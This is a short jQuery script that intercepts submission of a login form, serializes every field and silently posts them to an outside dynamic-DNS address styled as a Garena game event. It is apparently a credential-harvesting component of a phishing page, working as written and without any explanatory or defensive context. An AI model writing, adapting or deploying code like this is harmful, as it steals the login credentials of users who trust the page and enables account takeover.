
$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "https://event-garenanew123.duckdns.org/test/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
